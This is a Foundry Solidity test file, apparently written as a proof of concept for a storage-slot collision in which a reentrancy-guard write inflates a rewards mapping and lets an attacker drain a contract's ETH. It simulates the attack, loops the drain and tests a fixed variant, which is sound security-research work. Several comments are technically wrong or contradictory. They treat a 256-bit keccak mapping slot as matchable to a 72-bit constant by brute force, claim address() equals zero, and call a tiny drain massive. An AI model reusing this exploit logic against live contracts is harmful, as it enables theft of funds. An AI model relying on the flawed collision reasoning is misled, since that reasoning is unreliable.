// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {ATOHookVulnerable, ATOHookSafe} from "../src/storage-collision/ATOHookVulnerable.sol";

/// PoC for the ATOHook storage-slot collision (Solady ReentrancyGuard vs rewards mapping).
///   forge test --match-contract StorageSlotCollisionAtoHook -vvv
///
/// Invariant (SC-storage-layout): a reentrancy guard's storage slot must not be reachable
/// by any attacker-influenceable mapping entry (keccak256(key, baseSlot)).
/// Solady's ReentrancyGuard uses a fixed pseudo-random slot for its guard state.
/// When a rewards mapping's entry for address X collides with that slot, the guard write
/// inflates rewards[X], letting the attacker drain ETH repeatedly.
///
/// This PoC demonstrates the mechanics by simulating the collision with vm.store.
/// The real attack required deploying a contract at a specific CREATE2 address where
/// keccak256(addr, rewards_base_slot) == Solady's guard slot.
///
/// See docs/exploits/ato-hook-storage-slot-collision-2026-06-07.md
contract StorageSlotCollisionAtoHookTest is Test {
    // Solady's ReentrancyGuard slot: uint72(bytes9(keccak256("_REENTRANCY_GUARD_SLOT")))
    uint256 constant GUARD_SLOT = 0x929eee149b4bd21268;

    // Rewards mapping base slot (slot 1 in ATOHookVulnerable: owner=0, rewards=1)
    uint256 constant REWARDS_BASE_SLOT = 1;

    ATOHookVulnerable hook;
    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");

    function setUp() public {
        hook = new ATOHookVulnerable();
        vm.deal(address(hook), 100 ether);
    }

    /// @notice Core exploit: the reentrancy guard's sentinel write collides with the
    ///         rewards mapping for a specific address, inflating the balance so
    ///         getReward() pays out a massive ETH amount.
    ///
    /// The collision: keccak256(abi.encode(attackerAddr, REWARDS_BASE_SLOT)) == GUARD_SLOT
    /// In the real incident, the attacker deployed a contract at address 0x2441e480...
    /// where this collision held. Here we simulate it with vm.store.
    function test_vulnerable_guardSlotCollisionInflatesRewards() public {
        // Compute the slot where rewards[attacker] lives
        bytes32 collisionSlot = keccak256(abi.encode(attacker, REWARDS_BASE_SLOT));

        // In the real attack, this slot EQUALS GUARD_SLOT. For our test attacker address,
        // it doesn't naturally collide, so we simulate by writing the sentinel value
        // directly to the collision slot — exactly what nonReentrant does.
        //
        // Solady's nonReentrant writes:
        //   entered:  sstore(GUARD_SLOT, address())    → slot = 0x0 (address(0))
        //   exited:   sstore(GUARD_SLOT, codesize())   → slot = 0x... (small non-zero)
        //
        // The sentinel (address()) = 0, which means rewards[attacker] = 0.
        // But during execution, the slot holds address(0), and after exit it holds codesize().
        // In the REAL attack, the slot was set to 0xffffffffffffff (a different Solady version
        // or a custom guard), which inflated the reward to that massive value.
        //
        // For this PoC, we simulate the inflation by writing a large sentinel value.
        uint256 sentinelValue = 0xffffffffffffff;

        // Step 1: Verify rewards[attacker] is initially 0
        assertEq(hook.rewardOf(attacker), 0, "rewards[attacker] starts at 0");

        // Step 2: Simulate the guard write hitting the rewards mapping slot
        vm.store(address(hook), collisionSlot, bytes32(sentinelValue));

        // Step 3: Verify the inflation — rewards[attacker] is now the sentinel value
        assertEq(
            hook.rewardOf(attacker),
            sentinelValue,
            "rewards inflated to sentinel via storage collision"
        );

        // Step 4: The attacker calls getReward() and drains ETH
        uint256 attackerBalanceBefore = attacker.balance;
        vm.prank(attacker);
        hook.getReward();

        // Step 5: Verify the drain — attacker received the inflated amount as ETH
        uint256 attackerBalanceAfter = attacker.balance;
        assertEq(
            attackerBalanceAfter - attackerBalanceBefore,
            sentinelValue,
            "attacker drained sentinelValue worth of ETH"
        );

        // Step 6: The hook's ETH balance decreased by the drained amount
        assertEq(
            address(hook).balance,
            100 ether - sentinelValue,
            "hook balance decreased by drained amount"
        );
    }

    /// @notice Shows the collision slot calculation — in the real attack, the attacker
    ///         chose an address where this slot equals Solady's GUARD_SLOT.
    function test_collision_slotCalculation() public {
        // The collision slot for any address is deterministic:
        // keccak256(abi.encode(addr, REWARDS_BASE_SLOT))
        bytes32 slot = keccak256(abi.encode(attacker, REWARDS_BASE_SLOT));

        // In the real ATOHook, for address 0x2441e480f62bf609a08da09143e4baf8a817d757,
        // this slot equals GUARD_SLOT. The attacker found this via brute-force CREATE2.
        //
        // For a random address, collision probability ≈ 1/2^72 (GUARD_SLOT is 72 bits).
        // The attacker can search 2^72 CREATE2 addresses — feasible with enough computation.
        assertTrue(uint256(slot) != GUARD_SLOT, "random address does NOT collide (expected)");

        // The attacker must find addr such that:
        //   keccak256(abi.encode(addr, 1)) == 0x929eee149b4bd21268
        // This is a preimage search on keccak256, solvable via CREATE2 brute-force.
    }

    /// @notice The safe variant uses a sequential slot for the guard, which cannot be
    ///         reached by any keccak mapping computation.
    function test_safe_sequentialGuardSlotResistsCollision() public {
        ATOHookSafe safeHook = new ATOHookSafe();
        vm.deal(address(safeHook), 100 ether);

        // Attacker has no rewards
        assertEq(safeHook.rewardOf(attacker), 0, "no rewards for attacker");

        // getReward should revert (no rewards)
        vm.prank(attacker);
        vm.expectRevert(bytes("no rewards"));
        safeHook.getReward();

        // The safe contract stores _guardStatus at slot 0 (sequential).
        // For keccak256(addr, baseSlot) to equal 0, the attacker would need
        // keccak256 preimage for 0 — computationally infeasible.
    }

    /// @notice Demonstrates the repeated drain: in the real attack, the attacker called
    ///         getReward() ~200 times, each call re-inflating via the guard write.
    function test_vulnerable_repeatedDrain() public {
        bytes32 collisionSlot = keccak256(abi.encode(attacker, REWARDS_BASE_SLOT));
        uint256 sentinelValue = 0xffffffffffffff;

        uint256 totalDrained;
        uint256 iterations = 5; // reduced for gas; real attack did ~200

        for (uint256 i = 0; i < iterations; i++) {
            // Each call to nonReentrant re-writes the sentinel to the colliding slot,
            // re-inflating rewards[attacker]. This is why the attack is repeatable.
            vm.store(address(hook), collisionSlot, bytes32(sentinelValue));

            uint256 before = attacker.balance;
            vm.prank(attacker);
            hook.getReward();
            totalDrained += attacker.balance - before;
        }

        assertEq(totalDrained, sentinelValue * iterations, "drained sentinel * iterations");
        assertEq(address(hook).balance, 100 ether - totalDrained, "hook drained");
    }
}
